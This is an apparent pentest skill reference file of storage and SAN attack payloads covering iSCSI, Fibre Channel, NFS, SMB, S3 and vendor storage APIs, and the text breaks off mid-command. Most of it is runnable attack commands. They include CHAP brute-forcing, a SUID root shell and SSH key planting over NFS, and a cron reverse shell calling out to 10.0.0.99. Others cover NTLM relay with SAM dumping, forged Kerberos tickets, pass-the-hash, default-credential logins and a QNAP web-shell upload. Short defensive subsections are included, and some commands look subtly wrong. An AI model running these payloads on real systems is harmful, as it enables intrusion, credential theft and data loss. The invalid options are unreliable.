# Storage SAN Attack Payloads

> Companion to `SKILL.md`. All commands assume authorized engagement scope. Replace `REPLACE_WITH_YOUR_X` placeholders with engagement-specific values. Never commit real credentials, API keys, or customer bucket names.
> Sections are organized by attack surface: 1. iSCSI, 2. Fibre Channel, 3. NFS, 4. SMB, 5. S3/Object Storage, 6. Vendor APIs (NetApp/Dell/Pure/HPE/Hitachi/IBM/QNAP/Synology/TrueNAS), 7. NDMP, 8. SMI-S/SNMP Management, 9. Replication, 10. Ransomware Patterns.

---

## Index

- [1. iSCSI Attacks](#1-iscsi-attacks)
- [2. Fibre Channel Attacks](#2-fibre-channel-attacks)
- [3. NFS Attacks](#3-nfs-attacks)
- [4. SMB Attacks](#4-smb-attacks)
- [5. S3 / Object Storage Attacks](#5-s3--object-storage-attacks)
- [6. Vendor API Attacks](#6-vendor-api-attacks)
- [7. NDMP Attacks](#7-ndmp-attacks)
- [8. Management Plane Attacks (SMI-S / SNMP)](#8-management-plane-attacks-smi-s--snmp)
- [9. Replication / Sync Attacks](#9-replication--sync-attacks)
- [10. Ransomware Patterns](#10-ransomware-patterns)

---

## 1. iSCSI Attacks

### 1.1 Target Discovery (sendtargets)

iSCSI targets announce their LUNs via the `sendtargets` text command. Any host answering on TCP 3260 will return its target list to an unauthenticated initiator unless discovery is explicitly protected.

```bash
# Install the open-iscsi initiator
sudo apt install -y open-iscsi
sudo systemctl enable --now iscsid

# Discover targets on a host
iscsiadm -m discovery -t sendtargets -p 10.0.0.5

# Discover on multiple ports (some vendors use 3260, others 3261+)
for p in 3260 3261 3262 3205 3206; do
  echo "=== Port $p ==="
  iscsiadm -m discovery -t sendtargets -p 10.0.0.5:$p 2>/dev/null
done

# Sweep a subnet for iSCSI targets
nmap -p 3260 --open 10.0.0.0/24 -oG - | awk '/Up$/{print $2}' | while read h; do
  echo "=== $h ==="
  iscsiadm -m discovery -t sendtargets -p $h 2>/dev/null
done
```

```bash
# Nmap NSE: iscsi-info extracts target name, LUN count, and CHAP requirement
nmap -p 3260 10.0.0.5 --script=iscsi-info -sV

# Nmap NSE: iscsi-brute attempts CHAP secret brute-force
nmap -p 3260 10.0.0.5 --script=iscsi-brute --script-args=db=chap_secrets.txt
```

### 1.2 Unauthenticated Login

Many iSCSI deployments ship with discovery auth disabled and per-target CHAP not enforced. An attacker can log in and access a LUN with no credentials.

```bash
# Log in to a discovered target (no auth)
iscsiadm -m node -T iqn.2001-04.com.example:sn.Lun0 -p 10.0.0.5 -l

# Verify session is up
iscsiadm -m session -P 3
# Output shows: tcp: [1] 10.0.0.5:3260,1 iqn.2001-04.com.example:sn.Lun0

# Identify the block device assigned to the LUN
lsblk -S
# or
lsscsi
# Sample: [/dev/sdb] NetApp LUN C-Mode 0805
```

```bash
# Read-only mount of the LUN filesystem (safer than read-write)
sudo fdisk -l /dev/sdb
sudo mount -o ro /dev/sdb1 /mnt/lun

# If filesystem is unrecognized, image the LUN for offline analysis
sudo dcfldd if=/dev/sdb of=/tmp/lun.dd bs=4M hash=sha256
sudo losetup -fP /tmp/lun.dd
sudo mount -o ro /dev/loop0p1 /mnt/lun
```

### 1.3 LUN Enumeration Outside Auth

Even when CHAP is required, the SCSI INQUIRY command on a logged-out LUN may still leak target identity. Test with raw SCSI via `sg3_utils`:

```bash
# Install sg3_utils
sudo apt install -y sg3-utils

# Send SCSI INQUIRY to a device
sg_inq /dev/sdb

# Read LUN inventory via REPORT LUNS
sg_luns /dev/sdb

# Read capacity (size) of the LUN
sg_readcap /dev/sdb
```

### 1.4 CHAP Brute-Force

For targets requiring CHAP, brute-force the secret with a custom loop or nmap NSE:

```bash
# Brute via nmap iscsi-brute NSE
nmap -p 3260 10.0.0.5 --script=iscsi-brute \
  --script-args='userdb=users.txt,passdb=secrets.txt'

# Manual CHAP login attempt
cat > /etc/iscsi/nodes/iqn.2001-04.com.example\:sn.Lun0/10.0.0.5\,3260 <<EOF
node.session.auth.authmethod = CHAP
node.session.auth.username = REPLACE_WITH_YOUR_USER
node.session.auth.password = REPLACE_WITH_YOUR_SECRET
node.startup = automatic
EOF
iscsiadm -m node -T iqn.2001-04.com.example:sn.Lun0 -p 10.0.0.5 -l
```

### 1.5 LUN Fuzzing (MHDDoS-Style)

Fuzzing SCSI commands against a LUN can reveal unhandled error paths in the target firmware. Use with extreme caution and only on isolated test arrays.

```bash
# Capture baseline SCSI traffic for diff comparison
sudo tcpdump -i eth0 -w /tmp/iscsi_baseline.pcap 'port 3260'

# Send malformed SCSI CDBs via sg_raw (example: INQUIRY with invalid page code)
for opcode in 12 00 25 28 2a 88 a0; do
  echo "=== opcode $opcode ==="
  sudo sg_raw -r 1k /dev/sdb $opcode 00 00 00 00 00
done

# Capture fuzzed traffic
sudo tcpdump -i eth0 -w /tmp/iscsi_fuzz.pcap 'port 3260'

# Diff to identify new responses
tshark -r /tmp/iscsi_baseline.pcap -Y iscsi > /tmp/baseline.txt
tshark -r /tmp/iscsi_fuzz.pcap -Y iscsi > /tmp/fuzz.txt
diff /tmp/baseline.txt /tmp/fuzz.txt | head -50
```

### 1.6 Wireshark Dissection of iSCSI

```bash
# Capture iSCSI traffic with proper dissector activation
tshark -i eth0 -f 'tcp port 3260' -Y 'iscsi' -w /tmp/iscsi.pcap

# Extract SCSI CDBs and LUN numbers
tshark -r /tmp/iscsi.pcap -Y 'iscsi.opcode == 0x01' \
  -T fields -e frame.number -e iscsi.lun -e scsi.cdb

# Look for cleartext CHAP secrets (only on unencrypted sessions)
tshark -r /tmp/iscsi.pcap -Y 'iscsi.opcode == 0x40' \
  -T fields -e iscsi.CHAP_N -e iscsi.CHAP_R

# Detect iSNS registration (some targets leak IQN list via iSNS)
tshark -i eth0 -f 'tcp port 3205' -Y 'isns'
```

### 1.7 Defensive Detection — iSCSI

```bash
# Monitor for unexpected initiators (NetApp ONTAP audit)
ssh admin@netapp 'security audit log show -fields time,user,event,application'

# Linux target: log iscsiadm logins to syslog
sudo journalctl -u iscsid -f

# Network IDS: alert on sendtargets from non-storage-network IPs
suricata -c /etc/suricata/suricata.yaml -i eth0 \
  --set default-rule-path=/etc/suricata/rules
# Rule: alert tcp $EXTERNAL_NET any -> $STORAGE_NET 3260 (msg:"iSCSI sendtargets from external"; content:"|03 00 00 00|"; depth:4; sid:1000001;)
```

---

## 2. Fibre Channel Attacks

Fibre Channel fabrics use WWNs (World Wide Names) for identity and zoning to restrict which initiators see which targets. FC attacks target the fabric's trust model.

### 2.1 WWN Spoofing

```bash
# Install Linux Fibre Channel utilities
sudo apt install -y sysfsutils sg3-utils

# Enumerate local HBA WWNs
cat /sys/class/fc_host/host*/port_name
# Sample: 0x21000024ff5a7b3c

# Read current node WWN
systool -c fc_host -v | grep -E 'port_name|node_name'

# Temporarily change port_name (requires HBA that allows WWN programming)
echo 0x21000024ff5a7b3c | sudo tee /sys/class/fc_host/host3/port_name

# Emulate a specific WWN with QLogic HBA
sudo /opt/qlogic/qaucli -q setwwn -p 21:00:00:24:ff:5a:7b:3c
```

### 2.2 Zoning Bypass

```bash
# Enumerate fabric name server (requires fabric admin or permissive read)
nsshow                          # Brocade
nsallshow                       # Brocade (all VSANs)
show fcns database              # Cisco MDS

# Identify effective zones for a host
zoneshow
show zone active

# Look for "default zone" behavior — many fabrics default to "all see all"
cfgshow | grep -i 'defaultzone'
```

### 2.3 Name Server Spoofing

A compromised HBA can register fake entries in the fabric name server, redirecting traffic.

```bash
# Register a fake target with the name server
nscmd --register --wwn 21:00:00:24:ff:5a:7b:3c \
  --type target --fcid 0x650100

# Verify registration
nsshow | grep 21:00:00:24:ff:5a:7b:3c
```

### 2.4 FSPF Poisoning

FSPF (Fabric Shortest Path First) routes traffic between switches. A compromised switch can poison routes to intercept traffic.

```bash
# Show FSPF topology on Brocade
foscmd "fspf show topology"

# Show FSPF neighbors on Cisco MDS
show fspf internal vsan 1

# Inject a fake LS Update (requires fabric admin)
foscmd "fspf inject --interface 0 --cost 1 --domain 0x65"
```

### 2.5 FCIP Replay

FCIP tunnels FC over IP between data centers. Cleartext FCIP can be replayed.

```bash
# Capture FCIP traffic (TCP 3225)
sudo tcpdump -i eth0 -w /tmp/fcip.pcap 'tcp port 3225'

# Identify FCIP endpoints
tshark -r /tmp/fcip.pcap -Y 'fcip' -T fields \
  -e ip.src -e ip.dst | sort -u

# Replay a captured FCIP frame
tcpreplay --intf1=eth0 --loop=1 /tmp/fcip.pcap
```

### 2.6 Defensive Detection — Fibre Channel

```bash
# Brocade: enable fabric binding (only known WWNs may join)
foscmd "fabricbinding --enable"

# Cisco MDS: port security
conf t
  port-security activate vsan 1
  port-security database auto-learn vsan 1

# Enable fabric-wide deny on rogue WWN
foscmd "fdmi --deny --wwn 21:00:00:24:ff:5a:7b:3c"
```

---

## 3. NFS Attacks

### 3.1 NFSv3 SHOWMOUNT Enumeration

```bash
# List exports on a target
showmount -e 10.0.0.5

# List hosts that have mounted exports (often leaks client topology)
showmount -a 10.0.0.5

# Sweep a subnet for NFS
nmap -sV -p 2049 --open 10.0.0.0/24 -oG - | \
  awk '/Up$/{print $2}' | while read h; do
    echo "=== $h ==="
    showmount -e $h 2>/dev/null
  done
```

### 3.2 no_root_squash Exploitation

When `no_root_squash` is set, root on a client maps to root on the server. This is full filesystem compromise.

```bash
# Mount the export with root mapping preserved
sudo mkdir /mnt/nfs
sudo mount -t nfs -o vers=3,nolock 10.0.0.5:/data /mnt/nfs

# Write a SUID shell to the export
sudo cp /bin/bash /mnt/nfs/suid_shell
sudo chmod 4777 /mnt/nfs/suid_shell
# (On a host with /mnt/nfs as a filesystem: /mnt/nfs/suid_shell -p yields root)

# Write SSH authorized_keys for a known user
echo 'ssh-rsa AAAA... REPLACE_WITH_YOUR_PUBLIC_KEY' | \
  sudo tee -a /mnt/nfs/home/jsmith/.ssh/authorized_keys
sudo chmod 600 /mnt/nfs/home/jsmith/.ssh/authorized_keys

# Drop a cron job (Linux server)
sudo bash -c 'echo "* * * * * root /bin/bash -c \"/bin/nc -e /bin/bash 10.0.0.99 4444\"" > /mnt/nfs/etc/cron.d/pwn'
```

### 3.3 UID Spoofing

Even with root_squash, non-root UIDs map through. Forge a UID to impersonate any user.

```bash
# Use nfsshell to forge UID
nfsshell -h 10.0.0.5
nfs> uid 1001        # impersonate user with uid 1001
nfs> gid 1001
nfs> mount /home/jsmith
nfs> cd /home/jsmith/.ssh
nfs> get authorized_keys
nfs> put authorized_keys
```

```bash
# Use a forged-uid NFS mount via a UML/kernel-syscall trick
sudo unshare --user --map-root-user --mount
sudo mount -t nfs -o vers=3,nolock,uid=1001 10.0.0.5:/home/jsmith /mnt/nfs
```

### 3.4 NFSv4 ACL Bypass

NFSv4 supports rich ACLs but vendors differ in implementation. Test ACL inheritance and deny-bypass.

```bash
# Mount NFSv4
sudo mount -t nfs -o vers=4 10.0.0.5:/data /mnt/nfs

# Read NFSv4 ACL
nfs4_getfacl /mnt/nfs/secret.txt

# Attempt write bypass with a raw NFSv4 COMPOUND
# (via python nfs4 library)
python3 -c "
from nfs4 import NFS4Client
c = NFS4Client('10.0.0.5')
c.connect()
c.compound([c.putrootfh(), c.lookup('data'), c.lookup('secret.txt'), c.setattr({'mode': 0o644})])
"
```

### 3.5 RPC Path Manipulation

NFS rides on RPC. RPC info leaks target topology and access controls.

```bash
# RPC info
rpcinfo -p 10.0.0.5

# Probe specific RPC programs
rpcinfo -T udp 10.0.0.5 mountd
rpcinfo -T udp 10.0.0.5 nfs
rpcinfo -T udp 10.0.0.5 nlockmgr
rpcinfo -T udp 10.0.0.5 status

# Nmap NSE: complete NFS enumeration
nmap -p 111,2049 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 10.0.0.5
```

### 3.6 Defensive Detection — NFS

```bash
# Audit /etc/exports on the server for no_root_squash
grep -E 'no_root_squash|no_all_squash' /etc/exports

# Use NFSv4 with sec=krb5p (Kerberos + privacy)
mount -t nfs -o vers=4,sec=krb5p nfs.example.com:/data /mnt/nfs

# Whitelist clients in /etc/exports
/data  @storage_clients(rw,sec=krb5p,root_squash)
```

---

## 4. SMB Attacks

### 4.1 SMB1 Null Session

SMB1 null session is a classic recon primitive. Many NAS appliances still expose it for legacy client compatibility.

```bash
# Enumerate shares via null session
crackmapexec smb 10.0.0.5 -u '' -p '' --shares

#rpcclient null session
rpcclient -U "" -N 10.0.0.5
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo
rpcclient $> netshareenumall

# Enumerate via Impacket
python3 /opt/impacket/examples/smbclient.py -no-pass 10.0.0.5
```

### 4.2 SMB Signing Disable / Downgrade

```bash
# Check SMB signing configuration
crackmapexec smb 10.0.0.5 -u '' -p '' --gen-relay-list /tmp/relay_targets.txt
nmap -p 445 --script=smb2-security-mode 10.0.0.5

# Look for "signing: False" — relay candidate
crackmapexec smb 10.0.0.0/24 --gen-relay-list /tmp/relayable.txt
```

### 4.3 SMB Relay (ntlmrelayx)

```bash
# Relay captured NTLM to a target (assumes SMB signing disabled on target)
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t smb://10.0.0.5 -smb2support

# Relay + dump SAM
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t smb://10.0.0.5 -smb2support --dump-sam

# Relay + escalate a user to domain admin (if the relayed account has writepriv)
sudo python3 /opt/impacket/examples/ntlmrelayx.py \
  -t smb://10.0.0.5 -smb2support --escalate-user DOMAIN\\compromised_user
```

### 4.4 Kerberos Delegation Abuse

When a NAS is configured with Kerberos constrained delegation (CIFS), a coerced service ticket can be used to access it as any user.

```bash
# Discover constrained delegation via PowerView (Windows) or impacket-findDelegation (Linux)
python3 /opt/impacket/examples/findDelegation.py DOMAIN/user:password

# With an S4U2Self/S4U2Proxy (impacket-gets4uticket)
python3 /opt/impacket/examples/ticketer.py -spn cifs/nas.domain.com \
  -impersonate Administrator -user-id 500 \
  -nthash REPLACE_WITH_YOUR_RC4_KEY DOMAIN$

# Use the forged ticket
export KRB5CCNAME=/tmp/administrator.ccache
python3 /opt/impacket/examples/smbexec.py -k -no-pass nas.domain.com
```

### 4.5 SMB Share Mounting

```bash
# Mount a share with guest credentials
sudo mount -t cifs //10.0.0.5/data /mnt/smb -o username=guest,password=

# Mount with NTLM hash (pass-the-hash)
sudo mount -t cifs //10.0.0.5/data /mnt/smb \
  -o username=Administrator,uid=0,gid=0, \
     pwnt_hash=00000000000000000000000000000000: REPLACE_WITH_YOUR_NT_HASH

# Impacket smbclient with pass-the-hash
python3 /opt/impacket/examples/smbclient.py \
  DOMAIN/Administrator@10.0.0.5 -hashes :REPLACE_WITH_YOUR_NT_HASH
```

### 4.6 EternalBlue (Reference)

EternalBlue (MS17-010) affects SMBv1. See `skills/exploit-development/` for the full exploit chain — this skill covers the storage-targeting side: detect MS17-010 exposure on Windows NAS appliances.

```bash
# Nmap NSE: detect MS17-010
nmap -p 445 --script=smb-vuln-ms17-010 10.0.0.0/24

# crackmapexec MS17-010 module
crackmapexec smb 10.0.0.0/24 -u '' -p '' -M ms17-010
```

### 4.7 Defensive Detection — SMB

```bash
# Windows: require SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Samba: server signing = mandatory in smb.conf
#   server signing = mandatory
#   server min protocol = SMB2
#   client use spnego principal = yes
```

---

## 5. S3 / Object Storage Attacks

### 5.1 Bucket Enumeration

```bash
# AWS CLI anonymous probe (no signing)
aws s3 ls s3://REPLACE_WITH_BUCKET_NAME --no-sign-request --region us-east-1

# List a bucket's contents (anonymous)
aws s3api list-objects-v2 --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request

# Get bucket location
aws s3api get-bucket-location --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request

# Get bucket ACL
aws s3api get-bucket-acl --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request
```

### 5.2 Bucket Name Brute-Force (lazys3, bucket_finder, S3Scanner, slurp)

```bash
# lazys3 — Ruby tool that tests common name permutations
git clone https://github.com/craig23/lazys3 /opt/lazys3
ruby /opt/lazys3/lazys3.rb target-prefix

# bucket_finder — wordlist-driven
ruby /opt/bucket_finder/bucket_finder.rb --download wordlist.txt

# S3Scanner — Python, scans from a wordlist
git clone https://github.com/sa7mon/S3Scanner /opt/S3Scanner
python3 /opt/S3Scanner/s3scanner.py --list-file buckets.txt --dump-closed

# slurp — Go, fast enumeration
git clone https://github.com/bbb31/slurp /opt/slurp
/opt/slurp/slurp -perm -max 50 -t REPLACE_WITH_TARGET

# Masscan-style bucket name enumeration across S3 endpoints
for region in us-east-1 us-west-2 eu-west-1 ap-southeast-2; do
  for name in backup backups data files archive; do
    echo "=== $name in $region ==="
    curl -sI "https://${name}.s3.${region}.amazonaws.com/" | head -3
  done
done
```

### 5.3 Public Bucket Discovery

```bash
# Curl-based anonymous test
curl -sI "https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/"
#   200 = exists, listable
#   403 = exists, but ListObjects denied
#   404 = does not exist (or different region)

# Try ListObjects without signing
curl -s "https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/?list-type=2" | xmllint --format -

# Enumerate specific object keys (path-style URL)
for key in secret secrets backup backups .env config.gcfg id_rsa id_dsa; do
  echo "=== $key ==="
  curl -sI "https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/${key}"
done
```

### 5.4 ACL Bypass

```bash
# Get object ACL (anonymous)
curl -s "https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/secret.txt?acl" | xmllint --format -

# Attempt to PUT a new object (if write ACL is permissive)
echo 'pwned' > /tmp/marker.txt
curl -X PUT \
  --data-binary @/tmp/marker.txt \
  "https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/marker.txt"

# Attempt to overwrite an existing object
curl -X PUT \
  --data-binary @/tmp/overwrite.txt \
  "https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/index.html"
```

### 5.5 Policy Escalation

```bash
# Get bucket policy (anonymous or signed)
aws s3api get-bucket-policy --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request

# Identify wildcard Principal in policy
aws s3api get-bucket-policy --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request | \
  jq '.Policy | fromjson | .Statement[] | select(.Principal == "*" or .Principal.AWS == "*")'

# Identify overly-permissive Actions
aws s3api get-bucket-policy --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request | \
  jq '.Policy | fromjson | .Statement[] | .Action'
# Look for: s3:*, s3:DeleteObject, s3:PutObject, s3:PutBucketPolicy
```

### 5.6 Credential Extraction from URL / Object

```bash
# Scan downloaded objects for AWS keys
grep -rE 'AKIA[0-9A-Z]{16}' ./out/
grep -rE 'aws_secret_access_key' ./out/
grep -rE 'aws_session_token' ./out/

# Use TruffleHog on a bucket
trufflehog s3 --bucket=REPLACE_WITH_BUCKET_NAME --no-sign-request

# Use Gitleaks on downloaded bucket content
gitleaks detect --source ./out --no-banner
```

### 5.7 Provider Fingerprinting

```bash
# AWS S3 — Server: AmazonS3
curl -sI https://REPLACE_WITH_BUCKET_NAME.s3.amazonaws.com/ | grep -i server

# MinIO — Server: MinIO
curl -sI http://10.0.0.5:9000/ | grep -i server

# Ceph RGW — Server: Ceph
curl -sI http://10.0.0.5:7480/ | grep -i server

# Wasabi — Server: Wasabi
curl -sI https://s3.wasabisys.com/ | grep -i server

# Backblaze B2 — Server: backblaze
curl -sI https://s3.us-west-000.backblazeb2.com/ | grep -i server

# Azure Blob (not S3-compatible directly) — Server: Windows-Azure-Blob
curl -sI https://account.blob.core.windows.net/container | grep -i server

# GCP Cloud Storage — Server: UploadServer
curl -sI https://storage.googleapis.com/bucket | grep -i server

# OpenStack Swift — X-Trans-Id
curl -sI http://10.0.0.5:8080/v1/AUTH_account | grep -i x-trans
```

### 5.8 Azure Blob Specifics

```bash
# List containers (anonymous)
curl -s "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/?comp=list" | xmllint --format -

# List blobs in a container
curl -s "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/REPLACE_WITH_CONTAINER?restype=container&comp=list" | xmllint --format -

# Read a specific blob
curl -s "https://REPLACE_WITH_ACCOUNT.blob.core.windows.net/REPLACE_WITH_CONTAINER/REPLACE_WITH_BLOB"
```

### 5.9 GCP Cloud Storage Specifics

```bash
# List bucket contents (anonymous)
curl -s "https://storage.googleapis.com/REPLACE_WITH_BUCKET_NAME/?max-keys=1000"

# Download an object
curl -s "https://storage.googleapis.com/REPLACE_WITH_BUCKET_NAME/REPLACE_WITH_OBJECT"
```

### 5.10 MinIO / Ceph RGW Specifics

```bash
# MinIO Client setup
mc alias set eng http://10.0.0.5:9000 \
  REPLACE_WITH_YOUR_KEY REPLACE_WITH_YOUR_SECRET

# List buckets
mc ls eng/

# Mirror a bucket locally
mc mirror eng/REPLACE_WITH_BUCKET_NAME ./out

# Ceph RGW — use awscli against the RGW endpoint
aws --endpoint-url http://10.0.0.5:7480 \
    s3 ls s3://REPLACE_WITH_BUCKET_NAME \
    --no-sign-request
```

### 5.11 OpenStack Swift Specifics

```bash
# Get auth token (v1)
curl -s -H "X-Auth-User: REPLACE_WITH_USER" \
        -H "X-Auth-Key: REPLACE_WITH_KEY" \
     http://10.0.0.5:8080/auth/v1.0

# List containers with token
curl -s -H "X-Auth-Token: REPLACE_WITH_TOKEN" \
     http://10.0.0.5:8080/v1/AUTH_account

# List objects in a container
curl -s -H "X-Auth-Token: REPLACE_WITH_TOKEN" \
     http://10.0.0.5:8080/v1/AUTH_account/REPLACE_WITH_CONTAINER
```

### 5.12 Object Lock / Versioning Bypass

```bash
# Check versioning
aws s3api get-bucket-versioning --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request

# Check Object Lock
aws s3api get-object-lock-configuration --bucket REPLACE_WITH_BUCKET_NAME --no-sign-request

# If versioning enabled but not Object Lock: delete + restore version
aws s3api delete-object --bucket REPLACE_WITH_BUCKET_NAME --key target.txt
aws s3api list-object-versions --bucket REPLACE_WITH_BUCKET_NAME --prefix target.txt
aws s3api get-object --bucket REPLACE_WITH_BUCKET_NAME --key target.txt --version-id REPLACE_WITH_VERSION_ID restored.txt
```

### 5.13 Defensive Detection — S3

```bash
# Enable Block Public Access at account level
aws s3control put-public-access-block \
  --account-id REPLACE_WITH_YOUR_ACCOUNT_ID \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# Enable Object Lock on a bucket (compliance mode)
aws s3api create-bucket \
  --bucket REPLACE_WITH_BUCKET_NAME \
  --object-lock-enabled-for-bucket

# Bucket policy: deny unencrypted PutObject
aws s3api put-bucket-policy --bucket REPLACE_WITH_BUCKET_NAME --policy file://policy.json
# policy.json:
# {
#   "Statement": [{
#     "Effect": "Deny",
#     "Principal": "*",
#     "Action": "s3:PutObject",
#     "Condition": { "StringNotEquals": { "s3:x-amz-server-side-encryption": "AES256" } }
#   }]
# }
```

---

## 6. Vendor API Attacks

### 6.1 NetApp ONTAP

#### 6.1.1 ZAPI Auth Bypass

```bash
# Classic ZAPI invoke (still used in ONTAP 9.x)
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  -H "Content-Type: text/xml" \
  https://10.0.0.5/servlets/netapp.servlets.admin.XMLrequest_filer \
  -d '<?xml version="1.0" encoding="UTF-8"?>
      <netapp xmlns="http://www.netapp.com/filer/admin" version="1.21">
        <system-get-version/>
      </netapp>'

# List SVMs
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/servlets/netapp.servlets.admin.XMLrequest_filer \
  -d '<netapp xmlns="http://www.netapp.com/filer/admin" version="1.21">
        <vserver-get-iter/>
      </netapp>'

# List volumes
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/servlets/netapp.servlets.admin.XMLrequest_filer \
  -d '<netapp xmlns="http://www.netapp.com/filer/admin" version="1.21">
        <volume-get-iter/>
      </netapp>'
```

#### 6.1.2 REST API (ONTAP 9.6+)

```bash
# Get cluster info
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/cluster

# List volumes
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/storage/volumes

# List SVMs
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/svm/svms

# List snapshots (recovery points!)
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/api/storage/volumes/REPLACE_WITH_VOLUME_UUID/snapshots
```

#### 6.1.3 SSH Appliance Shell

```bash
# SSH to cluster admin
ssh admin@10.0.0.5

# At the cluster shell:
security login show                  # list admin accounts
vserver services name-service get-domain-name-servers  # cached LDAP
volume show -fields junction-path    # all NFS/SMB shares
export-policy show                   # NFS exports
cifs share show                      # SMB shares
```

### 6.2 Dell EMC

#### 6.2.1 Naviseccli Default Creds

```bash
# Default creds on VNX/Unity: admin/admin, nasadmin/nasadmin, sysadmin/sysadmin
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 \
  -user nasadmin -password nasadmin \
  -scope 0 getagent

# List storage processors
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 \
  -user nasadmin -password nasadmin getlun

# List RAID groups
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 \
  -user nasadmin -password nasadmin getrg

# List storage groups (host-to-LUN mapping)
/opt/Navisphere/bin/naviseccli -h 10.0.0.5 \
  -user nasadmin -password nasadmin storagegroup -list
```

#### 6.2.2 Dell EMC Unity REST API

```bash
# Login (default admin/Password123! on some versions)
curl -k -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"REPLACE_WITH_YOUR_PASSWORD"}' \
  https://10.0.0.5/api/types/login/instances | jq

# Use returned token
TOKEN=REPLACE_WITH_YOUR_TOKEN
curl -k -H "X-EMC-REST-CLIENT: true" \
        -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/types/lun/instances

# List hosts (reveals host IQNs and initiators)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/types/host/instances
```

### 6.3 Pure Storage

```bash
# Get API token
curl -k -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"REPLACE_WITH_YOUR_PASSWORD"}' \
  https://10.0.0.5/api/1.0/auth/apitoken | jq

# Use token (in Authorization header)
TOKEN=REPLACE_WITH_YOUR_TOKEN
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/1.0/volume

# List hosts
curl -k -H "Authorization: Bearer $TOKEN" \
  https://10.0.0.5/api/1.0/host

# Purity token theft — search exposed metadata endpoints
curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null
```

#### 6.3.1 Pure Storage Python SDK

```python
from purestorage import FlashArray
fa = FlashArray("10.0.0.5", "admin", "REPLACE_WITH_YOUR_PASSWORD")
print(fa.list_volumes())
print(fa.list_hosts())
print(fa.list_hostgroups())
# Extract API tokens of all admin users
print(fa.list_admins())
```

### 6.4 HPE Nimble / NimbleOS

```bash
# Login (default admin/admin on some deployments)
curl -k -X POST \
  -H "Content-Type: application/json" \
  -d '{"data":{"username":"admin","password":"REPLACE_WITH_YOUR_PASSWORD"}}' \
  https://10.0.0.5:5392/v1/tokens | jq

# Use returned token
TOKEN=REPLACE_WITH_YOUR_TOKEN
curl -k -H "X-Auth-Token: $TOKEN" \
  https://10.0.0.5:5392/v1/volumes

curl -k -H "X-Auth-Token: $TOKEN" \
  https://10.0.0.5:5392/v1/initiators
```

### 6.5 Hitachi VSP

```bash
# Hitachi Storage Navigator web — default admin/Password123 pattern
# REST API via Tiered Storage Manager
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/ConfigurationManager/v1/objects/storages

# Get LDEVs (logical volumes)
curl -k -u admin:REPLACE_WITH_YOUR_PASSWORD \
  https://10.0.0.5/ConfigurationManager/v1/objects/storages/REPLACE_WITH_STORAGE_ID/ldevs
```

### 6.6 IBM Spectrum Scale / GPFS

```bash
# SSH to a GPFS node
ssh admin@10.0.0.5

# List filesystems
mmlsfile system

# List nodes
mmlsnode --all

# List filesystem auth (looks at exported roles)
mmlsfs fs1 -k
```

### 6.7 QNAP QTS

#### 6.7.1 Default Creds + Web Shell

```bash
# Default admin/admin
curl -k -X POST 'https://10.0.0.5:8080/cgi-bin/quick/quick.cgi' \
  -d 'user=admin&password=REPLACE_WITH_YOUR_PASSWORD&act=login'

# After login: download /etc/config/uLinux.conf (contains all settings)
TOKEN=REPLACE_WITH_YOUR_TOKEN
curl -k -b "NAS_USER=admin; NAS_SID=$TOKEN" \
  'https://10.0.0.5:8080/cgi-bin/filemanager/utilRequest.cgi?func=get_file_list&sid=Storage&path=/etc/config'

# Known web-shell drop point (QNAP Apache)
curl -k -b "NAS_USER=admin; NAS_SID=$TOKEN" \
  -X POST -F 'file=@webshell.php' \
  'https://10.0.0.5:8080/cgi-bin/filemanager/upload.cgi?func=upload_file&sid=Storage&dest_path=/home/httpd'
```

#### 6.7.2 CVE References (DeadBolt Family)

```bash
# Photo Station CVE chain (CVE-2022-27593, CVE-2022-27596 etc.) — referenced, not exploited
nmap -p 8080,443 --script=http-title 10.0.0.5
# Title containing "QTS" + version == assess against CISA AA22-059A
```

### 6.8 Synology DSM

#### 6.8.1 Default Creds

```bash
# Default admin/admin (DSM 6.x) — DSM 7+ forces password change on first boot
curl -k -X POST 'https://10.0.0.5:5001/webapi/auth.cgi' \
